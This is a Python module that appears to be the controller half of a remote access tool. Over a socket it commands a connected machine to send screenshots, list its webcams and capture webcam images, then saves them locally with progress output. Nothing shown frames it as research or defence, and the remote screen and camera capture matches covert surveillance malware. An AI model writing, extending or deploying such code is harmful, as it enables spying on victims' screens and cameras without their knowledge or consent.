import socket
import os,time,struct
from File_IO import Sort_Name,Recv_All


BASE_DIR = os.path.dirname(__file__)

SCREENSHOT_PATH = os.path.join(BASE_DIR,'ScreenShot')
WEBCAMSHOT_PATH = os.path.join(BASE_DIR,'Webcam_capture')

if(not os.path.exists(SCREENSHOT_PATH)):
    os.mkdir(SCREENSHOT_PATH)

if(not os.path.exists(WEBCAMSHOT_PATH)):
    os.mkdir(WEBCAMSHOT_PATH)

def ScreenShot(sock):
    Time = time.ctime(time.time())
    Time = Time.replace(':','-')
    Path = os.path.join(SCREENSHOT_PATH,'Screenshot-'+Time+'.png')
    
    try:
        
        try:
            file = open(Path,'wb')
        except OSError as Err:
            print(str(Err));return 0
        
        total = 0

        sock.send(int(11).to_bytes(4,'little'))
        response_type = sock.recv(4)
        Len = int.from_bytes(response_type,'little')
        if(Len == 0):
            response_type = sock.recv(4)
            print('[-]Error Occured.Error code : ',int.from_bytes(response_type,'little'));file.close();os.remove(Path)
            return 0
        else:
            while(total < Len):
                data = sock.recv(Len)
                total += len(data)
                file.write(data);file.flush()
                print("\r[+]Screenshot Received(In Percent): %d"%((total/Len)*100),end='')
            file.close()
            print("[+]Screenshot Saved as "+Path)
            return 0    
    
    except socket.timeout as Err:
        print(str(Err));return 404

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except PermissionError as Err:
        print(str(Err));return 0    


def List_Webcam(sock):
    try:
        sock.send(int(12).to_bytes(4,'little'))
        while 1:
            data = struct.unpack_from("=L80s80s",Recv_All(sock,164))

            if(data[0] == 404):
                break
            else:
                print("%d  %s\t%s"%(data[0],Sort_Name(data[1]),Sort_Name(data[2])))

    except struct.error as Err:
        print(str(Err));return 0
        
    except socket.timeout as Err:
        print(str(Err));return 404

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404


def Webcam_Capture(sock,nid):
    Time = time.ctime(time.time())
    Time = Time.replace(':','-')
    Path = os.path.join(WEBCAMSHOT_PATH,'Webcam_Capture-'+Time+'.png')
    
    try:
        id = int(nid)
        if(id <0  or id > 9):
            print("[-]Driver Id Must Be between 0-9");return 0

        try:
            file = open(Path,'wb')
        except OSError as Err:
            print(str(Err));return 0

        total = 0

        sock.send(int(13).to_bytes(4,'little')+id.to_bytes(4,'little'))
        response_type = sock.recv(4)
        Len = int.from_bytes(response_type,'little')
        if(Len == 404):
            response_type = sock.recv(4)
            print('[-]Error Occured.Error code : ',int.from_bytes(response_type,'little'));file.close();os.remove(Path)
            return 0
        else:
            while(Len > total):
                data = sock.recv(Len)
                total += len(data)
                file.write(data);file.flush()
                print("\r[+]Webcam Capture Received(In Percent): %d"%((total/Len)*100),end='')
            file.close()
            print("[+]Webcam Capture Saved as "+Path)
            return 0    
    
    except socket.timeout as Err:
        print(str(Err));return 404

    except ConnectionAbortedError as Err:
        print(str(Err));return 404

    except ConnectionError as Err:
        print(str(Err));return 404

    except ValueError as Err:
        print(str(Err));return 0

    except PermissionError as Err:
        print(str(Err));return 0        